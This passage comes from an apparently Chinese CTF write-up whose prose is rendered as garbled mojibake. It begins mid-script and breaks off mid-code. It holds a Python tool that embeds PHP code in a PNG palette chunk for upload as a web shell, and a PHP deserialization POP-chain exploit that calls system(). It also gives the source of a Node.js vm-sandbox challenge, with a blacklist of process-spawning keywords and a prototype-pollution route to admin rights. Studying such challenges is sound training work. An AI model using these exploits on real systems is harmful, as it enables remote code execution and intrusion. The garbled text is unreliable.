im[payload_pos+i] = self.payload[i]</span><br><span class="line"></span><br><span class="line">            crc_pos = self.plte_pos + <span class="number">8</span> + self.plte_len</span><br><span class="line">            crc_checks = self.crc(<span class="string">&#x27;&#x27;</span>.join(im[self.plte_pos+<span class="number">4</span>: crc_pos]))</span><br><span class="line">            crc_checks = crc_checks.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">            <span class="comment"># modify crc</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                im[crc_pos+i] = crc_checks[i]</span><br><span class="line">            self.im = <span class="string">&#x27;&#x27;</span>.join(im)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code_len = <span class="built_in">len</span>(self.payload)            <span class="comment"># must be a multiple of 3</span></span><br><span class="line">            add_len = code_len % <span class="number">3</span></span><br><span class="line">            <span class="keyword">if</span> add_len:</span><br><span class="line">                add_len = <span class="number">3</span> - add_len</span><br><span class="line">                </span><br><span class="line">            plte_len = (<span class="string">&#x27;%08x&#x27;</span> % (code_len+add_len)).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">            plte_type = <span class="string">&#x27;PLTE&#x27;</span></span><br><span class="line">            plte_data = self.payload + <span class="string">&#x27; &#x27;</span> * add_len</span><br><span class="line">            plte_crc = self.crc(plte_type+plte_data).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">            plte_chunk = plte_len + plte_type + plte_data + plte_crc</span><br><span class="line"></span><br><span class="line">            im = self.data[:self.plte_pos]</span><br><span class="line">            im += plte_chunk</span><br><span class="line">            im += self.data[(self.plte_pos+<span class="number">12</span>+self.plte_len):]</span><br><span class="line">            self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save</span>(<span class="params">self, imfile</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(imfile, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(self.im)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    debug = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        info_code = <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        php_code = info_code</span><br><span class="line">        php_png = <span class="string">&#x27;php_long.png&#x27;</span></span><br><span class="line">        png_file = <span class="string">&#x27;test.png&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">        parser = argparse.ArgumentParser()</span><br><span class="line">        parser.add_argument(<span class="string">&#x27;in_file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;input png file&#x27;</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, dest=<span class="string">&#x27;payload&#x27;</span>,</span><br><span class="line">                <span class="built_in">help</span>=<span class="string">&#x27;php code to add to PLTE chunk&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">        parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, dest=<span class="string">&quot;out_file&quot;</span>, default=<span class="string">&#x27;php.png&#x27;</span>,</span><br><span class="line">                <span class="built_in">help</span>=<span class="string">&#x27;output png file, default is php.png&#x27;</span>)</span><br><span class="line">        args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">        png_file = args.in_file</span><br><span class="line">        php_code = args.payload</span><br><span class="line">        php_png = args.out_file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        png = PNG()</span><br><span class="line">        png.openpng(png_file)</span><br><span class="line">        png.set_payload(php_code)</span><br><span class="line">        png.modify_plte()</span><br><span class="line">        png.save(php_png)</span><br><span class="line">    <span class="keyword">except</span> PNGError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Error massage: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e.value)</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ æ”¹åç¼€ä¸º.php</p><p><a href="https://imgse.com/i/pPxKjNq"><img src="https://z1.ax1x.com/2023/10/09/pPxKjNq.png" alt="pPxKjNq.png"></a></p><p><a href="https://imgse.com/i/pPxKv40"><img src="https://z1.ax1x.com/2023/10/09/pPxKv40.png" alt="pPxKv40.png"></a></p><h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p>ç®€å•pop</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DataObject::__destruct() =&gt; Storage::__set() =&gt; Cache::expired() =&gt; Helper::__call()</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$expired</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$helper</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public function __construct($key, $value, $helper) &#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;key = $key;</span></span><br><span class="line"><span class="comment">//        $this-&gt;value = $value;</span></span><br><span class="line"><span class="comment">//        $this-&gt;helper = $helper;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        $this-&gt;expired = False;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;expired = False;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">expired</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;expired) &#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;helper-&gt;<span class="title function_ invoke__">clean</span>(<span class="variable">$this</span>-&gt;key);</span><br><span class="line">            <span class="keyword">return</span> True;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> False;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Storage</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$store</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;store = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;store) &#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;store = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$value</span>-&gt;<span class="title function_ invoke__">expired</span>()) &#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;store[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public function __construct($funcs) &#123;</span></span><br><span class="line"><span class="comment">//        $this-&gt;funcs = $funcs;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs[<span class="variable">$name</span>](...<span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataObject</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$storage</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;data <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;storage-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title class_">DataObject</span>();</span><br><span class="line"><span class="variable">$storage</span> = <span class="keyword">new</span> <span class="title class_">Storage</span>();</span><br><span class="line"><span class="variable">$cache</span> = <span class="keyword">new</span> <span class="title class_">Cache</span>();</span><br><span class="line"><span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>-&gt;storage = <span class="variable">$storage</span>;</span><br><span class="line"><span class="variable">$data</span>-&gt;data = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="variable">$cache</span>);</span><br><span class="line"><span class="variable">$cache</span>-&gt;expired = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$cache</span>-&gt;key = <span class="string">&#x27;env&#x27;</span>;</span><br><span class="line"><span class="variable">$cache</span>-&gt;helper = <span class="variable">$helper</span>;</span><br><span class="line"><span class="variable">$helper</span>-&gt;funcs = <span class="keyword">array</span>(<span class="string">&#x27;clean&#x27;</span>=&gt;<span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€åæ”¹Cacheå±æ€§ä¸ªæ•°å€¼ç»•è¿‡wake_up</p><p><a href="https://imgse.com/i/piQ5CHs"><img src="https://z1.ax1x.com/2023/11/05/piQ5CHs.png" alt="piQ5CHs.png"></a></p><h3 id="ez-sandbox"><a href="#ez-sandbox" class="headerlink" title="ez_sandbox"></a>ez_sandbox</h3><p>æºç </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: crypto.<span class="title function_">randomBytes</span>(<span class="number">64</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> users = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> admins = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clone</span>(<span class="params">source</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, source)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> blacklist = [<span class="string">&#x27;constructor&#x27;</span>, <span class="string">&#x27;mainModule&#x27;</span>, <span class="string">&#x27;require&#x27;</span>, <span class="string">&#x27;child_process&#x27;</span>, <span class="string">&#x27;process&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execSync&#x27;</span>, <span class="string">&#x27;execFile&#x27;</span>, <span class="string">&#x27;execFileSync&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>, <span class="string">&#x27;spawnSync&#x27;</span>, <span class="string">&#x27;fork&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> v <span class="keyword">of</span> blacklist) &#123;</span><br><span class="line">        <span class="keyword">if</span> (code.<span class="title function_">includes</span>(v)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(v + <span class="string">&#x27; is banned&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">requireLogin</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">user</span>) &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_">next</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>[key]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, requireLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/index.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/login.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/register.html&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">clone</span>(req.<span class="property">body</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username <span class="keyword">in</span> users &amp;&amp; password === users[username]) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = username</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (username <span class="keyword">in</span> admins) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">role</span> = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.<span class="title function_">send</span>(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login success&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;login failed&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; username, password &#125; = <span class="title function_">clone</span>(req.<span class="property">body</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username <span class="keyword">in</span> users) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;register failed&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        users[username] = password</span><br><span class="line">        res.<span class="title function_">send</span>(&#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;register success&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/profile&#x27;</span>, requireLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: req.<span class="property">session</span>.<span class="property">user</span>,</span><br><span class="line">        <span class="string">&#x27;role&#x27;</span>: req.<span class="property">session</span>.<span class="property">role</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/sandbox&#x27;</span>, requireLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span></span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="title function_">waf</span>(code)</span><br><span class="line">            <span class="keyword">let</span> result = vm.<span class="title function_">runInContext</span>(code, context)</span><br><span class="line">            res.<span class="title function_">send</span>(&#123;</span><br><span class="line">                <span class="string">&#x27;result&#x27;</span>: result</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(&#123;</span><br><span class="line">                <span class="string">&#x27;result&#x27;</span>: e.<span class="property">message</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(&#123;</span><br><span class="line">            <span class="string">&#x27;result&#x27;</span>: <span class="string">&#x27;Your role is not admin, so you can not run any code&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, requireLogin, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="title function_">destroy</span>()</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;server start listening on :3000&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>éœ€è¦å…ˆæˆä¸ºadminæ‰æœ‰åœ¨<code>/sandbox</code>æ‰§è¡Œå‘½ä»¤çš„æƒé™ï¼ŒéªŒè¯æ¡ä»¶ä¹Ÿå¾ˆæ˜ç¡®ï¼Œåªéœ€ç™»å½•çš„ç”¨æˆ·å­˜åœ¨äºadminå¯¹è±¡ä¸­å³å¯ã€‚é€šè¿‡åŸå‹é“¾æ±¡æŸ“å°†åˆ›å»ºçš„ç”¨æˆ·æ±¡æŸ“åˆ°å¤§Objectä¸­ï¼Œå½“å°è¯•è°ƒç”¨<code>admins.username</code>ä¼šç»§ç»­å¾€ä¸ŠæŸ¥æ‰¾ï¼Œ<code>admins.__proto__.username</code>ï¼Œæœ€ç»ˆåœ¨Objectä¸­æ‰¾åˆ°<code>admins.username</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 